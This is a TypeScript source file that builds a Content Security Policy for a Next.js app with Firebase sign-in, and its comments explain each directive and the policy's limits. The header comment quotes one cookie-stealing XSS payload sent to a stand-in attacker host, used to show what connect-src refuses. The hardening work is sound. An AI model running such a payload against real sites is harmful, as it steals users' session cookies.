/**
 * The Content Security Policy, and an honest account of what it can enforce.
 *
 * ── Why this exists ──
 * A review of the documentation renderer found markdown-authored HTML reaching
 * `dangerouslySetInnerHTML` on a prerendered page. The renderer was fixed at
 * source, but the incident's second finding was that nothing stood behind it:
 * the application shipped no CSP at all, so an injected `<script>` had the run
 * of the origin the dashboard is served from. This is the layer that was
 * missing.
 *
 * ── What it cannot do, and why ──
 * It cannot stop an injected inline `<script>` from executing. That is a
 * property of the stack rather than a preference:
 *
 *  - The App Router streams its RSC payload as an inline
 *    `self.__next_f.push([1,"…"])` script. It is per-page — about 28 KB on the
 *    home page — so there is no hash to pin, and hydration does not happen
 *    without it.
 *  - The alternative is a per-request nonce, which Next can only apply when
 *    Proxy sets it on the request. ADR 0008 records why this deployment has no
 *    Proxy and cannot have one: Next 16 defaults it to the Node runtime and
 *    forbids the `runtime` option there, and `@opennextjs/cloudflare` exits 1
 *    rather than build a Node middleware. There is no configuration satisfying
 *    both.
 *  - Nonces would also force every page dynamic, which would take the
 *    documentation and marketing pages off prerendering.
 *
 * Because a hash or nonce in `script-src` makes browsers *ignore*
 * `'unsafe-inline'`, this is not a spectrum to slide along: either the flight
 * payload is allowed inline or the application does not hydrate.
 *
 * ── What it does do, which is most of the damage ──
 * Injected script still executes; what it can accomplish is what changes. The
 * payload the review actually demonstrated was
 * `fetch("https://evil.example?c=" + document.cookie)`, and `connect-src 'self'`
 * refuses it. So does the `<img>` beacon, under `img-src`. Loading a second
 * stage from an attacker's origin is refused by `script-src`, which names this
 * origin and one Google host and nothing else; posting the page's data to one
 * is refused by `form-action 'self'`, rewriting every relative URL on the page
 * by `base-uri 'self'`, and the plugin-based vectors by `object-src 'none'`. An
 * injection becomes noisy and local instead of a foothold.
 *
 * Read `experimental.sri` in `next.config.ts` for the one hardening deliberately
 * not taken.
 */

/**
 * Google's identity endpoints, which the Firebase Auth SDK calls from the
 * browser.
 *
 * Named here rather than discovered, because a policy that is assembled from
 * whatever the SDK happened to request is a policy nobody can review. These two
 * are the documented hosts for the email/password and ID-token refresh flows —
 * `identitytoolkit` signs in and `securetoken` exchanges refresh tokens — and
 * this application uses no other Google service from the client.
 */
const GOOGLE_IDENTITY_HOSTS = [
  'https://identitytoolkit.googleapis.com',
  'https://securetoken.googleapis.com',
] as const;

/**
 * Google's script loader, which the sign-in popup does not open without.
 *
 * `signInWithPopup` does not go straight to `window.open`. It initialises the
 * resolver first — `browserPopupRedirectResolver`, wired up explicitly in
 * `lib/firebase.ts` — and that resolver initialises by injecting a `<script>`
 * for `https://apis.google.com/js/api.js`, the URL the SDK registers as its
 * `gapiScript`. Only once gapi has loaded does it embed the hidden
 * `https://{authDomain}/__/auth/handler` iframe that carries the answer back.
 *
 * A `script-src` omitting this host does not degrade the flow, it ends it: the
 * loader is refused, `_loadGapi` rejects, and every Google sign-in fails with
 * `auth/network-request-failed` — a message that sends the reader looking for a
 * network outage rather than for a header. The first version of this file
 * omitted it, and a test asserting that `script-src` named no remote host at
 * all stood over the omission looking like a security property.
 *
 * One host covers the whole of it: the loader fetches its own modules from
 * `https://apis.google.com/_/scs/…`, the same origin. The reCAPTCHA scripts the
 * SDK also registers are deliberately absent — only `RecaptchaVerifier` and
 * phone auth load those, and this application uses neither.
 *
 * Named unconditionally, like the identity hosts above and for the same reason:
 * it is Google's host rather than the project's, so it does not vary with a
 * self-hoster's configuration, and a policy whose shape changes with the
 * environment is one nobody can review by reading it.
 */
const GOOGLE_SCRIPT_HOST = 'https://apis.google.com';

/**
 * The project's own Firebase domain, read from the config the client already
 * gets.
 *
 * `signInWithPopup` opens `https://{authDomain}/__/auth/handler` and the SDK
 * keeps a hidden iframe on the same host to hear the answer, so the domain has
 * to appear in `frame-src` and `connect-src`. Deriving it from
 * `NEXT_PUBLIC_FIREBASE_CONFIG` rather than hard-coding it is what keeps a
 * self-hoster's own Firebase project working — the alternative is a policy that
 * silently only permits sign-in to this project's deployment.
 *
 * Absent or unparseable config yields nothing, and the policy is simply built
 * without those entries: a deployment with no Firebase configured has no
 * sign-in to break, and a malformed value is already reported by `check:env`
 * with a far better message than a CSP failure would give.
 */
export function firebaseAuthOrigin(rawConfig: string | undefined): string | null {
  if (!rawConfig) return null;

  try {
    const parsed: unknown = JSON.parse(rawConfig);
    if (typeof parsed !== 'object' || parsed === null) return null;

    const authDomain = (parsed as Record<string, unknown>)['authDomain'];
    if (typeof authDomain !== 'string' || authDomain === '') return null;

    // Through `URL` rather than by concatenation, so a value that already
    // carries a scheme, a path or a stray slash cannot smuggle a second source
    // expression into the directive it lands in.
    return new URL(`https://${authDomain.replace(/^https?:\/\//, '')}`).origin;
  } catch {
    return null;
  }
}

export interface CspOptions {
  /** `next dev` needs allowances a deployment must never be given. */
  isDevelopment: boolean;
  /** Usually `process.env.NEXT_PUBLIC_FIREBASE_CONFIG`. */
  firebaseConfig: string | undefined;
}

export function contentSecurityPolicy({ isDevelopment, firebaseConfig }: CspOptions): string {
  const firebase = firebaseAuthOrigin(firebaseConfig);
  const identity = [...GOOGLE_IDENTITY_HOSTS, ...(firebase === null ? [] : [firebase])];

  const directives: Record<string, readonly string[]> = {
    // Everything not named below falls here, so a directive nobody thought
    // about fails closed rather than being unrestricted.
    'default-src': ["'self'"],

    // `'unsafe-inline'` is the RSC flight payload — see the header. It is not
    // reachable by an attacker who cannot already inject into the document, and
    // an attacker who can is constrained by every other directive here.
    //
    // The Google host is the sign-in popup's script loader, and is the only
    // remote origin this application ever executes code from — see above.
    //
    // In development React reconstructs server stacks with `eval`, which is
    // exactly the capability a deployment must not hand out.
    'script-src': [
      "'self'",
      "'unsafe-inline'",
      GOOGLE_SCRIPT_HOST,
      ...(isDevelopment ? ["'unsafe-eval'"] : []),
    ],

    // Inline styles are a different risk from inline scripts: they cannot call
    // anything, and the exfiltration tricks built on CSS selectors need a
    // request to an attacker's origin, which `img-src` and `connect-src` refuse.
    // Next injects its own `<style>` blocks and Tailwind's layer ordering rides
    // on them, so this is not optional either.
    'style-src': ["'self'", "'unsafe-inline'"],

    // `data:` for the generated brand mark and the QR-shaped inline assets;
    // `blob:` for anything the client composes before showing it. No remote
    // origin: an `<img>` to somewhere else is a beacon whether or not it draws.
    'img-src': ["'self'", 'data:', 'blob:'],

    // `next/font` downloads Geist at build time and serves it from this origin,
    // so there is no font host to allow.
    'font-src': ["'self'"],

    // The one directive that turns a script injection from a breach into a
    // nuisance: with nowhere to send it, stolen data stays on the page.
    'connect-src': ["'self'", ...identity],

    // The Firebase popup helper only. Everything else that could host a frame
    // is refused, and `frame-ancestors` below refuses the reverse.
    'frame-src': ["'self'", ...(firebase === null ? [] : [firebase])],

    'object-src': ["'none'"],
    'base-uri': ["'self'"],
    'form-action': ["'self'"],

    // The modern half of `X-Frame-Options: DENY`, which is also set. Both, not
    // either: the header is what older browsers read, this is what current ones
    // read, and clickjacking a secret manager is worth two lines.
    'frame-ancestors': ["'none'"],

    'worker-src': ["'self'", 'blob:'],
    'manifest-src': ["'self'"],
  };

  const rendered = Object.entries(directives).map(
    ([name, sources]) => `${name} ${sources.join(' ')}`,
  );

  // Not in development, where the dev server is plain http on localhost and
  // this would make every asset request unservable.
  if (!isDevelopment) rendered.push('upgrade-insecure-requests');

  return rendered.join('; ');
}
